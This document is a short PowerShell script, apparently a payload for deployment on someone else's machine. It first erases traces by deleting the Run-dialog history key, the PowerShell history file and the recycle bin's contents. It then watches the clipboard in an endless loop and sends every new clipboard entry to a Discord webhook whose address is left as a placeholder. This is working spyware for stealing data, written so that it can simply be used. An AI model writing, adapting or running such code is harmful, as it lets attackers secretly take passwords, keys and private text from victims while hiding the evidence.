reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
Remove-Item (Get-PSreadlineOption).HistorySavePath
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

$prev_clip = Get-Clipboard -Raw

$dc = "your discord webhook here"

$body = @{
    content = "Connection made"
}

Invoke-RestMethod -Uri $dc -Method Post -Body $body

while($true) {
    try {
        $clip = Get-Clipboard -Raw
    } catch {
        Write-Host "Error: $_"
    }
    
    if ( $clip -ne $prev_clip ) {

        Write-Output "Clipboard: $clip"
        $prev_clip = $clip

        $clip_length = $clip | Measure-Object -Character | Select-Object -ExpandProperty Characters
        Write-Output $clip_length

        if ( $clip_length -gt 2000 ) {
            Write-Output "Length over 2000"
            $content = "Users clipboard contents exceeded 2000 characters, unable to send (will be fixed in future update)"
        }
        else {
            $content = "Extracted clipboard contents: ``````$clip``````"
        }

        $body = @{
            content = $content
        }

        Invoke-RestMethod -Uri $dc -Method Post -Body $body

    }

    Start-Sleep -Seconds 3
}
